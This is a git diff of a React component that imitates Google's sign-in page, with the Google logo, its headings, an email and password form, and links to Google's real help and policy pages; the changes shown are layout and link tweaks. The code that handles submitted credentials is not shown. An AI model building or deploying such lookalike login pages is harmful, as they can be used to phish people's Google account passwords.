@@ -1,5 +1,5 @@
 import React, { useState } from "react";
-import googleLogo from "./google.png"; // adjust path if needed
+import googleLogo from "./google.png";
 
 const GoogleLoginPage = () => {
   const [formData, setFormData] = useState({ email: "", password: "" });
@@ -24,17 +24,24 @@ const GoogleLoginPage = () => {
   };
 
   return (
-    <div className="min-h-screen flex flex-col justify-between" style={{ backgroundColor: "#F0F4F9" }}>
-      <main className="flex-grow flex items-center justify-center">
-        <div className="bg-white rounded-[28px] shadow-md max-w-3xl w-full flex flex-col md:flex-row p-8 md:p-12">
-          <div className="md:w-1/3 flex flex-col items-center md:items-start">
-            <img src={googleLogo} alt="Google Logo" className="w-20 h-20 mb-4" />
-            <h1 className="text-3xl font-normal text-[#202124] mb-1">Sign in</h1>
-            <p className="text-sm text-[#3c4043] mb-6">Use your Google Account</p>
-          </div>
+    <div
+      className="min-h-screen flex flex-col justify-between"
+      style={{ backgroundColor: "#F0F4F9" }}
+    >
+      {/* Main Content */}
+      <main className="flex-grow flex items-center justify-center p-6">
+        <div className="bg-white rounded-3xl shadow-md flex flex-row items-start px-12 py-20 w-full max-w-5xl">
+          {/* Left side */}
+          <div className="w-1/2 pr-8 flex flex-col items-start justify-start">
+          <img src={googleLogo} alt="Google Logo" className="w-20 h-20 mb-2 mt-0" />
+          <h1 className="text-3xl font-normal text-[#202124] mb-1">Sign in</h1>
+          <p className="text-sm text-[#3c4043] mb-6">Use your Google Account</p>
+        </div>
+
+          {/* Right side form */}
           <form
             onSubmit={handleSubmit}
-            className="md:w-2/3 flex flex-col"
+            className="w-1/2 flex flex-col max-w-sm"
             autoComplete="off"
           >
             <input
@@ -98,19 +105,27 @@ const GoogleLoginPage = () => {
             strokeLinecap="round"
             strokeLinejoin="round"
             viewBox="0 0 24 24"
-            aria-hidden="true"
           >
             <polyline points="6 9 12 15 18 9"></polyline>
           </svg>
         </div>
         <div className="flex gap-6">
-          <a href="https://support.google.com/accounts?hl=en&visit_id=638882847316884916-1390047257&rd=2&p=account_iph#topic=3382296" className="hover:underline">
+          <a
+            href="https://support.google.com/accounts?hl=en"
+            className="hover:underline"
+          >
             Help
           </a>
-          <a href="https://policies.google.com/privacy?gl=PK&hl=en-US" className="hover:underline">
+          <a
+            href="https://policies.google.com/privacy?hl=en"
+            className="hover:underline"
+          >
             Privacy
           </a>
-          <a href="https://policies.google.com/terms?gl=PK&hl=en-US" className="hover:underline">
+          <a
+            href="https://policies.google.com/terms?hl=en"
+            className="hover:underline"
+          >
             Terms
           </a>
         </div>
@@ -120,3 +135,4 @@ const GoogleLoginPage = () => {
 };
 
 export default GoogleLoginPage;
+
